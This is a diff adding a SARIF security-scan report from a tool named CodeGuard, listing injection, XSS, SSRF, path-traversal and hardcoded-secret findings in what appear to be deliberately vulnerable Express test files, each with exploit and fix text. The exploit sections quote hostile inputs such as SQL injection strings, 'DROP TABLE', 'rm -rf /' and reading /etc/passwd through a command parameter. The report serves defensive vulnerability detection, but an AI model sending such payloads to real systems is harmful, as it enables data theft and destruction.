@@ -1,0 +1,1947 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "CodeGuard",
+          "version": "1.0.0",
+          "informationUri": "https://github.com/your-org/codeguard",
+          "rules": [
+            {
+              "id": "javascript.lang.security.audit.sqli.node-mysql-sqli.node-mysql-sqli",
+              "name": "node-mysql-sqli",
+              "shortDescription": {
+                "text": "The application constructs an SQL query by directly concatenating a user-controlled `input` variable (which originates from `req.query.id`) into the SQL string. This direct string concatenation is highly vulnerable to SQL injection, as an attacker can embed malicious SQL syntax within the `input` to alter the query's logic, bypass authentication, or exfiltrate/manipulate data."
+              },
+              "fullDescription": {
+                "text": "The application constructs an SQL query by directly concatenating a user-controlled `input` variable (which originates from `req.query.id`) into the SQL string. This direct string concatenation is highly vulnerable to SQL injection, as an attacker can embed malicious SQL syntax within the `input` to alter the query's logic, bypass authentication, or exfiltrate/manipulate data."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "WARNING",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.express.security.audit.express-check-csurf-middleware-usage.express-check-csurf-middleware-usage",
+              "name": "express-check-csurf-middleware-usage",
+              "shortDescription": {
+                "text": "The Express application does not appear to have a Cross-Site Request Forgery (CSRF) protection middleware (such as `csurf`) or explicit CSRF token validation implemented. This lack of protection makes the application vulnerable to CSRF attacks, where an attacker can trick an authenticated user into performing unintended actions on the application by sending forged requests from a different site."
+              },
+              "fullDescription": {
+                "text": "The Express application does not appear to have a Cross-Site Request Forgery (CSRF) protection middleware (such as `csurf`) or explicit CSRF token validation implemented. This lack of protection makes the application vulnerable to CSRF attacks, where an attacker can trick an authenticated user into performing unintended actions on the application by sending forged requests from a different site."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "INFO",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.mysql.node-mysql-hardcoded-secret.node-mysql-hardcoded-secret",
+              "name": "node-mysql-hardcoded-secret",
+              "shortDescription": {
+                "text": "The database password, represented by `DB_PASSWORD`, is identified as being hardcoded directly within the application's source code. Hardcoding sensitive credentials makes them highly vulnerable to exposure if the codebase is accessed by unauthorized individuals (e.g., via a public repository, compromised build system, or internal leak), potentially leading to unauthorized database access."
+              },
+              "fullDescription": {
+                "text": "The database password, represented by `DB_PASSWORD`, is identified as being hardcoded directly within the application's source code. Hardcoding sensitive credentials makes them highly vulnerable to exposure if the codebase is accessed by unauthorized individuals (e.g., via a public repository, compromised build system, or internal leak), potentially leading to unauthorized database access."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "WARNING",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.express.mysql.express-mysql-sqli.express-mysql-sqli",
+              "name": "express-mysql-sqli",
+              "shortDescription": {
+                "text": "The application constructs an SQL query by directly concatenating user-controlled input (`req.query.id`) into the `query` string at line 44 (`const query = 'SELECT * FROM users WHERE id = ' + id`). This `query` variable is then executed by `db.query` at line 53. This direct string concatenation of user input makes the application highly vulnerable to SQL injection, enabling attackers to inject malicious SQL code."
+              },
+              "fullDescription": {
+                "text": "The application constructs an SQL query by directly concatenating user-controlled input (`req.query.id`) into the `query` string at line 44 (`const query = 'SELECT * FROM users WHERE id = ' + id`). This `query` variable is then executed by `db.query` at line 53. This direct string concatenation of user input makes the application highly vulnerable to SQL injection, enabling attackers to inject malicious SQL code."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "CRITICAL",
+                "tags": [
+                  "Semgrep",
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript.express.express-child-process.express-child-process",
+              "name": "express-child-process",
+              "shortDescription": {
+                "text": "The application uses `child_process.exec` to execute a `command` string that is directly taken from user input (`req.query.cmd`). The `exec` function spawns a shell and executes the command string, making it susceptible to shell metacharacter injection. This direct execution without proper sanitization or validation makes the application highly vulnerable to command injection, allowing an attacker to execute arbitrary operating system commands on the server."
+              },
+              "fullDescription": {
+                "text": "The application uses `child_process.exec` to execute a `command` string that is directly taken from user input (`req.query.cmd`). The `exec` function spawns a shell and executes the command string, making it susceptible to shell metacharacter injection. This direct execution without proper sanitization or validation makes the application highly vulnerable to command injection, allowing an attacker to execute arbitrary operating system commands on the server."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "CRITICAL",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.lang.security.detect-child-process.detect-child-process",
+              "name": "detect-child-process",
+              "shortDescription": {
+                "text": "The application directly executes a command string (`req.query.cmd`) received from user input without any sanitization or validation. This allows an attacker to inject arbitrary shell commands, leading to a Remote Command Execution (RCE) vulnerability."
+              },
+              "fullDescription": {
+                "text": "The application directly executes a command string (`req.query.cmd`) received from user input without any sanitization or validation. This allows an attacker to inject arbitrary shell commands, leading to a Remote Command Execution (RCE) vulnerability."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "ERROR",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.express.security.injection.raw-html-format.raw-html-format",
+              "name": "raw-html-format",
+              "shortDescription": {
+                "text": "User-supplied input (`req.query.q`) is directly embedded into the HTML response without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML or JavaScript code, leading to a Cross-Site Scripting (XSS) vulnerability."
+              },
+              "fullDescription": {
+                "text": "User-supplied input (`req.query.q`) is directly embedded into the HTML response without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML or JavaScript code, leading to a Cross-Site Scripting (XSS) vulnerability."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "WARNING",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript_express_cross_site_scripting",
+              "name": "javascript_express_cross_site_scripting",
+              "shortDescription": {
+                "text": "User-supplied input (`req.query.q`) is directly embedded into the HTTP response without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML or JavaScript code, leading to a Cross-Site Scripting (XSS) vulnerability."
+              },
+              "fullDescription": {
+                "text": "User-supplied input (`req.query.q`) is directly embedded into the HTTP response without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML or JavaScript code, leading to a Cross-Site Scripting (XSS) vulnerability."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Semgrep",
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript.express.express-fs-filename.express-fs-filename",
+              "name": "express-fs-filename",
+              "shortDescription": {
+                "text": "The application directly constructs a file path (`fs.readFile(file, ...)`) using unsanitized user input (`req.query.file`). This allows an attacker to manipulate the file path using sequences like `../` to access or read files outside the intended directory, leading to a Path Traversal vulnerability."
+              },
+              "fullDescription": {
+                "text": "The application directly constructs a file path (`fs.readFile(file, ...)`) using unsanitized user input (`req.query.file`). This allows an attacker to manipulate the file path using sequences like `../` to access or read files outside the intended directory, leading to a Path Traversal vulnerability."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "WARNING",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+              "name": "hardcoded-jwt-secret",
+              "shortDescription": {
+                "text": "The JWT signing secret (`'secret'`) is hardcoded directly into the source code. This is a critical security vulnerability because if the secret is discovered (e.g., through code leaks, reverse engineering), an attacker can forge valid JWTs, impersonate users, and bypass authentication."
+              },
+              "fullDescription": {
+                "text": "The JWT signing secret (`'secret'`) is hardcoded directly into the source code. This is a critical security vulnerability because if the secret is discovered (e.g., through code leaks, reverse engineering), an attacker can forge valid JWTs, impersonate users, and bypass authentication."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "WARNING",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.jsonwebtoken.security.jwt-none-alg.jwt-none-alg",
+              "name": "jwt-none-alg",
+              "shortDescription": {
+                "text": "The code explicitly allows the 'none' algorithm for JWT verification. This algorithm means no signature is expected or checked. An attacker can craft any token payload, set the 'alg' header to 'none', and the application will accept it as valid, effectively bypassing authentication or authorization checks. This is a severe integrity bypass vulnerability."
+              },
+              "fullDescription": {
+                "text": "The code explicitly allows the 'none' algorithm for JWT verification. This algorithm means no signature is expected or checked. An attacker can craft any token payload, set the 'alg' header to 'none', and the application will accept it as valid, effectively bypassing authentication or authorization checks. This is a severe integrity bypass vulnerability."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "ERROR",
+                "tags": [
+                  "Semgrep"
+                ]
+              }
+            },
+            {
+              "id": "javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli",
+              "name": "express-mongo-nosqli",
+              "shortDescription": {
+                "text": "The application constructs a Mongoose `findOne` query directly using user-supplied `username` and `password` from `req.body` without any sanitization or validation. An attacker can inject NoSQL query operators (e.g., `$ne`, `$gt`, `$or`) into these fields, manipulating the query logic to bypass authentication or gain unauthorized access to data."
+              },
+              "fullDescription": {
+                "text": "The application constructs a Mongoose `findOne` query directly using user-supplied `username` and `password` from `req.body` without any sanitization or validation. An attacker can inject NoSQL query operators (e.g., `$ne`, `$gt`, `$or`) into these fields, manipulating the query logic to bypass authentication or gain unauthorized access to data."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "CRITICAL",
+                "tags": [
+                  "Semgrep",
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_express_hardcoded_secret",
+              "name": "javascript_express_hardcoded_secret",
+              "shortDescription": {
+                "text": "The JWT signing secret `'secret'` (line 120) is hardcoded directly into the application's source code. A hardcoded secret is easily discoverable if the source code is compromised or reverse-engineered. If an attacker knows the JWT signing secret, they can forge valid JWTs, impersonate users, and gain unauthorized access to protected resources without needing to authenticate."
+              },
+              "fullDescription": {
+                "text": "The JWT signing secret `'secret'` (line 120) is hardcoded directly into the application's source code. A hardcoded secret is easily discoverable if the source code is compromised or reverse-engineered. If an attacker knows the JWT signing secret, they can forge valid JWTs, impersonate users, and gain unauthorized access to protected resources without needing to authenticate."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_express_nosql_injection",
+              "name": "javascript_express_nosql_injection",
+              "shortDescription": {
+                "text": "The application directly takes the `filter` parameter from the request query string (line 166), parses it as JSON, and uses the resulting object as a query for `mongoose.model('User').find()`. This allows an attacker to inject arbitrary query operators (e.g., `$where`, `$gt`, `$ne`) or modify the query logic, leading to unauthorized data access, modification, or even authentication bypass depending on the context. This is a classic NoSQL Injection vulnerability."
+              },
+              "fullDescription": {
+                "text": "The application directly takes the `filter` parameter from the request query string (line 166), parses it as JSON, and uses the resulting object as a query for `mongoose.model('User').find()`. This allows an attacker to inject arbitrary query operators (e.g., `$where`, `$gt`, `$ne`) or modify the query logic, leading to unauthorized data access, modification, or even authentication bypass depending on the context. This is a classic NoSQL Injection vulnerability."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_dynamic_os_command",
+              "name": "javascript_lang_dynamic_os_command",
+              "shortDescription": {
+                "text": "The application directly takes the `cmd` parameter from the request query string (line 65) and executes it using `child_process.exec()`. There is no sanitization or validation of the user-provided input. This creates a critical Command Injection vulnerability, allowing an attacker to inject arbitrary shell commands, which will be executed on the server with the privileges of the Node.js process."
+              },
+              "fullDescription": {
+                "text": "The application directly takes the `cmd` parameter from the request query string (line 65) and executes it using `child_process.exec()`. There is no sanitization or validation of the user-provided input. This creates a critical Command Injection vulnerability, allowing an attacker to inject arbitrary shell commands, which will be executed on the server with the privileges of the Node.js process."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "hardcoded_secret",
+              "name": "hardcoded_secret",
+              "shortDescription": {
+                "text": "A Stripe test API key (`sk_test_...`) is hardcoded directly into the source code. Hardcoding any secret, even a test key, is a critical security vulnerability as it makes the credential accessible to anyone with access to the codebase. This can lead to unauthorized use or, if a similar pattern is used for live keys, a path to production compromise."
+              },
+              "fullDescription": {
+                "text": "A Stripe test API key (`sk_test_...`) is hardcoded directly into the source code. Hardcoding any secret, even a test key, is a critical security vulnerability as it makes the credential accessible to anyone with access to the codebase. This can lead to unauthorized use or, if a similar pattern is used for live keys, a path to production compromise."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "CRITICAL",
+                "tags": [
+                  "Bearer",
+                  "Gitleaks"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_hardcoded_secret",
+              "name": "javascript_lang_hardcoded_secret",
+              "shortDescription": {
+                "text": "A database password (`DB_PASSWORD`) is hardcoded directly into the source code. Hardcoding sensitive credentials like database passwords is a severe security flaw because it exposes the password to anyone who can view the code, including developers, CI/CD systems, and potential attackers."
+              },
+              "fullDescription": {
+                "text": "A database password (`DB_PASSWORD`) is hardcoded directly into the source code. Hardcoding sensitive credentials like database passwords is a severe security flaw because it exposes the password to anyone who can view the code, including developers, CI/CD systems, and potential attackers."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_jwt_hardcoded_secret",
+              "name": "javascript_lang_jwt_hardcoded_secret",
+              "shortDescription": {
+                "text": "The application uses a hard-coded, weak secret (`'secret'`) to sign JSON Web Tokens (JWTs). This makes the tokens highly vulnerable to brute-force attacks or dictionary attacks, allowing an attacker to discover the secret. Once the secret is known, an attacker can forge arbitrary valid JWTs for any user, thereby bypassing authentication and impersonating users. The absence of an `expiresIn` option further means tokens, once compromised, remain valid indefinitely."
+              },
+              "fullDescription": {
+                "text": "The application uses a hard-coded, weak secret (`'secret'`) to sign JSON Web Tokens (JWTs). This makes the tokens highly vulnerable to brute-force attacks or dictionary attacks, allowing an attacker to discover the secret. Once the secret is known, an attacker can forge arbitrary valid JWTs for any user, thereby bypassing authentication and impersonating users. The absence of an `expiresIn` option further means tokens, once compromised, remain valid indefinitely."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_sql_injection",
+              "name": "javascript_lang_sql_injection",
+              "shortDescription": {
+                "text": "The application constructs a SQL query by directly concatenating user-controlled input (`input`) into the query string without any form of sanitization, validation, or parameterization. This makes the application vulnerable to SQL injection, allowing an attacker to manipulate the query to gain unauthorized access to data, modify database records, or even execute arbitrary commands on the underlying database system."
+              },
+              "fullDescription": {
+                "text": "The application constructs a SQL query by directly concatenating user-controlled input (`input`) into the query string without any form of sanitization, validation, or parameterization. This makes the application vulnerable to SQL injection, allowing an attacker to manipulate the query to gain unauthorized access to data, modify database records, or even execute arbitrary commands on the underlying database system."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_express_server_side_request_forgery",
+              "name": "javascript_express_server_side_request_forgery",
+              "shortDescription": {
+                "text": "The application accepts a URL directly from user input (`req.query.url`) and then makes an HTTP request to that URL using `axios.get()`. This is a Server-Side Request Forgery (SSRF) vulnerability. An attacker can supply internal or local network URLs (e.g., `http://localhost`, `http://169.254.169.254` for AWS metadata, or internal IP addresses) to force the server to make requests to those locations. This can be used to scan internal networks, access sensitive internal services, bypass firewalls, or exploit trust relationships between the server and other internal systems."
+              },
+              "fullDescription": {
+                "text": "The application accepts a URL directly from user input (`req.query.url`) and then makes an HTTP request to that URL using `axios.get()`. This is a Server-Side Request Forgery (SSRF) vulnerability. An attacker can supply internal or local network URLs (e.g., `http://localhost`, `http://169.254.169.254` for AWS metadata, or internal IP addresses) to force the server to make requests to those locations. This can be used to scan internal networks, access sensitive internal services, bypass firewalls, or exploit trust relationships between the server and other internal systems."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_http_url_using_user_input",
+              "name": "javascript_lang_http_url_using_user_input",
+              "shortDescription": {
+                "text": "The application uses user-controlled input (`req.body.url`) directly as the target URL for an `axios.post` request. An attacker can provide an arbitrary URL, forcing the server to make requests to internal network resources, cloud metadata APIs (e.g., AWS EC2 metadata service), or other external services, potentially leading to information disclosure, port scanning, or further attacks."
+              },
+              "fullDescription": {
+                "text": "The application uses user-controlled input (`req.body.url`) directly as the target URL for an `axios.post` request. An attacker can provide an arbitrary URL, forcing the server to make requests to internal network resources, cloud metadata APIs (e.g., AWS EC2 metadata service), or other external services, potentially leading to information disclosure, port scanning, or further attacks."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_non_literal_fs_filename",
+              "name": "javascript_lang_non_literal_fs_filename",
+              "shortDescription": {
+                "text": "The application constructs a file path using unsanitized user input (`req.query.file`) and passes it directly to `fs.readFile`. An attacker can inject path traversal sequences (e.g., `../`) to read arbitrary files outside the intended directory, potentially accessing sensitive configuration files, source code, or credential files."
+              },
+              "fullDescription": {
+                "text": "The application constructs a file path using unsanitized user input (`req.query.file`) and passes it directly to `fs.readFile`. An attacker can inject path traversal sequences (e.g., `../`) to read arbitrary files outside the intended directory, potentially accessing sensitive configuration files, source code, or credential files."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_raw_html_using_user_input",
+              "name": "javascript_lang_raw_html_using_user_input",
+              "shortDescription": {
+                "text": "The application embeds unsanitized user input (`req.query.q`) directly into the HTML response without any encoding. This creates a reflected Cross-Site Scripting (XSS) vulnerability, allowing an attacker to inject arbitrary HTML or JavaScript code into the victim's browser, which will then be executed in the context of the application's domain."
+              },
+              "fullDescription": {
+                "text": "The application embeds unsanitized user input (`req.query.q`) directly into the HTML response without any encoding. This creates a reflected Cross-Site Scripting (XSS) vulnerability, allowing an attacker to inject arbitrary HTML or JavaScript code into the victim's browser, which will then be executed in the context of the application's domain."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_express_helmet_missing",
+              "name": "javascript_express_helmet_missing",
+              "shortDescription": {
+                "text": "The application does not use Helmet.js middleware, which is an essential package for Express applications that sets various security-enhancing HTTP headers. Without Helmet, the application lacks protections against common client-side attacks such as Cross-Site Scripting (XSS) via missing Content Security Policy, clickjacking via missing X-Frame-Options, MIME-type sniffing via missing X-Content-Type-Options, and more."
+              },
+              "fullDescription": {
+                "text": "The application does not use Helmet.js middleware, which is an essential package for Express applications that sets various security-enhancing HTTP headers. Without Helmet, the application lacks protections against common client-side attacks such as Cross-Site Scripting (XSS) via missing Content Security Policy, clickjacking via missing X-Frame-Options, MIME-type sniffing via missing X-Content-Type-Options, and more."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_express_reduce_fingerprint",
+              "name": "javascript_express_reduce_fingerprint",
+              "shortDescription": {
+                "text": "The Express application, by default, sends the `X-Powered-By: Express` header in its HTTP responses. This header reveals information about the server's technology stack, which can assist attackers in fingerprinting the application and targeting known vulnerabilities specific to Express or Node.js versions. While not a direct vulnerability, it provides useful reconnaissance information to potential attackers."
+              },
+              "fullDescription": {
+                "text": "The Express application, by default, sends the `X-Powered-By: Express` header in its HTTP responses. This header reveals information about the server's technology stack, which can assist attackers in fingerprinting the application and targeting known vulnerabilities specific to Express or Node.js versions. While not a direct vulnerability, it provides useful reconnaissance information to potential attackers."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            },
+            {
+              "id": "javascript_lang_observable_timing",
+              "name": "javascript_lang_observable_timing",
+              "shortDescription": {
+                "text": "The application compares a user-supplied token (`req.body.token`) with a sensitive API token (`process.env.API_TOKEN`) using the standard JavaScript strict equality operator (`===`). This operator is not guaranteed to perform comparisons in constant time across all JavaScript engines and environments. An attacker could potentially perform a timing attack by sending various token prefixes and observing slight differences in response times. These timing discrepancies can reveal how many characters of the provided token match the sensitive stored token, allowing the attacker to progressively guess the full API token character by character."
+              },
+              "fullDescription": {
+                "text": "The application compares a user-supplied token (`req.body.token`) with a sensitive API token (`process.env.API_TOKEN`) using the standard JavaScript strict equality operator (`===`). This operator is not guaranteed to perform comparisons in constant time across all JavaScript engines and environments. An attacker could potentially perform a timing attack by sending various token prefixes and observing slight differences in response times. These timing discrepancies can reveal how many characters of the provided token match the sensitive stored token, allowing the attacker to progressively guess the full API token character by character."
+              },
+              "helpUri": "https://owasp.org/www-project-top-ten/",
+              "properties": {
+                "severity": "HIGH",
+                "tags": [
+                  "Bearer"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "javascript.lang.security.audit.sqli.node-mysql-sqli.node-mysql-sqli",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application constructs an SQL query by directly concatenating a user-controlled `input` variable (which originates from `req.query.id`) into the SQL string. This direct string concatenation is highly vulnerable to SQL injection, as an attacker can embed malicious SQL syntax within the `input` to alter the query's logic, bypass authentication, or exfiltrate/manipulate data.\n\nExploit: An attacker could send a request that sets `input` to `1 OR 1=1 --`. The resulting query would be `SELECT * FROM users WHERE id = 1 OR 1=1 --`, which would return all records from the `users` table instead of just the user with ID 1, effectively bypassing access controls. More severe attacks like `1; DROP TABLE users; --` could also be attempted.\n\nFix: This fix uses a parameterized query. Instead of directly concatenating the user input, a placeholder `?` is used in the SQL string, and the `input` variable is passed as a separate argument to the `db.query` method. The database driver then properly escapes the input, preventing it from being interpreted as executable SQL code."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/services/userService.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 14
+                }
+              }
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "This fix uses a parameterized query. Instead of directly concatenating the user input, a placeholder `?` is used in the SQL string, and the `input` variable is passed as a separate argument to the `db.query` method. The database driver then properly escapes the input, preventing it from being interpreted as executable SQL code."
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/services/userService.js",
+                    "uriBaseId": "%SRCROOT%"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 14
+                      },
+                      "insertedContent": {
+                        "text": "db.query(\n    \"SELECT * FROM users WHERE id = ?\",\n    [input]\n  )"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": true,
+            "issueId": "CG-001"
+          }
+        },
+        {
+          "ruleId": "javascript.express.security.audit.express-check-csurf-middleware-usage.express-check-csurf-middleware-usage",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] The Express application does not appear to have a Cross-Site Request Forgery (CSRF) protection middleware (such as `csurf`) or explicit CSRF token validation implemented. This lack of protection makes the application vulnerable to CSRF attacks, where an attacker can trick an authenticated user into performing unintended actions on the application by sending forged requests from a different site.\n\nExploit: If an authenticated user is tricked into visiting a malicious website, that website could craft and automatically submit a hidden form or an AJAX request to the vulnerable application's endpoint (e.g., a money transfer or password change endpoint). Since the user is authenticated, their browser would automatically include session cookies, making the forged request appear legitimate to the server, leading to an unauthorized action.\n\nFix: This fix involves integrating the `csurf` middleware along with `cookie-parser` into the Express application. The `csurf` middleware generates a unique CSRF token for each user, which must be included in all state-changing (POST, PUT, DELETE) requests. The server then verifies this token against the one stored in the session/cookie, preventing requests that originate from external, malicious sites."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 24
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 35,
+            "confidenceLevel": "LOW",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-002"
+          }
+        },
+        {
+          "ruleId": "javascript.mysql.node-mysql-hardcoded-secret.node-mysql-hardcoded-secret",
+          "level": "error",
+          "message": {
+            "text": "[HIGH] The database password, represented by `DB_PASSWORD`, is identified as being hardcoded directly within the application's source code. Hardcoding sensitive credentials makes them highly vulnerable to exposure if the codebase is accessed by unauthorized individuals (e.g., via a public repository, compromised build system, or internal leak), potentially leading to unauthorized database access.\n\nExploit: If an attacker gains access to the source code, they can easily extract the hardcoded database credentials (`DB_PASSWORD`). With these credentials, the attacker can then directly connect to the database, bypassing the application's security, and gain full control over the data, including reading, modifying, or deleting sensitive information.\n\nFix: This fix removes the hardcoded password by retrieving it from an environment variable (`process.env.DB_PASSWORD`). Storing credentials in environment variables (or a dedicated secrets management system) ensures that sensitive information is not directly embedded in the codebase, making it more secure and easier to manage across different deployment environments."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 46
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 45,
+            "confidenceLevel": "MEDIUM",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-003"
+          }
+        },
+        {
+          "ruleId": "javascript.express.mysql.express-mysql-sqli.express-mysql-sqli",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application constructs an SQL query by directly concatenating user-controlled input (`req.query.id`) into the `query` string at line 44 (`const query = 'SELECT * FROM users WHERE id = ' + id`). This `query` variable is then executed by `db.query` at line 53. This direct string concatenation of user input makes the application highly vulnerable to SQL injection, enabling attackers to inject malicious SQL code.\n\nExploit: An attacker could send a request to `/user?id=1 OR 1=1 --`. The `id` variable would then be `1 OR 1=1 --`, resulting in the query `SELECT * FROM users WHERE id = 1 OR 1=1 --`. This query would effectively bypass the `id` filter and return all user records from the database, potentially exposing sensitive information.\n\nFix: This fix prevents SQL injection by replacing direct string concatenation with a parameterized query. The `id` variable is passed as a separate argument to `db.query`, allowing the database driver to properly escape the input. This ensures that the user input is treated as data, not as executable SQL code, thus neutralizing any injected malicious SQL."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 53
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 85,
+            "confidenceLevel": "VERY HIGH",
+            "detectedBy": [
+              "Semgrep",
+              "Bearer"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-004"
+          }
+        },
+        {
+          "ruleId": "javascript.express.express-child-process.express-child-process",
+          "level": "error",
+          "message": {
+            "text": "[CRITICAL] The application uses `child_process.exec` to execute a `command` string that is directly taken from user input (`req.query.cmd`). The `exec` function spawns a shell and executes the command string, making it susceptible to shell metacharacter injection. This direct execution without proper sanitization or validation makes the application highly vulnerable to command injection, allowing an attacker to execute arbitrary operating system commands on the server.\n\nExploit: An attacker could send a request like `/run?cmd=ls -la` to list directory contents, or more maliciously, `/run?cmd=rm -rf /` (if permissions allow), or `/run?cmd=cat /etc/passwd` to read system files. They could also chain commands using `&&` or `;`, e.g., `/run?cmd=echo hello && id`, to execute multiple commands.\n\nFix: This fix implements several layers of defense. First, it introduces a strict whitelist for `allowedCommands`, ensuring that only explicitly permitted commands can be executed. Second, it switches from `child_process.exec` to `child_process.execFile`. `execFile` is safer because it directly executes the specified command without spawning a shell, preventing shell metacharacter injection. User-supplied input is passed as separate arguments, ensuring it is treated as data rather than executable code."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/test-vuln-2.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 67
+                }
+              }
+            }
+          ],
+          "fixes": [],
+          "properties": {
+            "confidence": "HIGH",
+            "confidenceScore": 70,
+            "confidenceLevel": "HIGH",
+            "detectedBy": [
+              "Semgrep"
+            ],
+            "autoFixable": false,
+            "issueId": "CG-005"
+          }
+        },
+        {
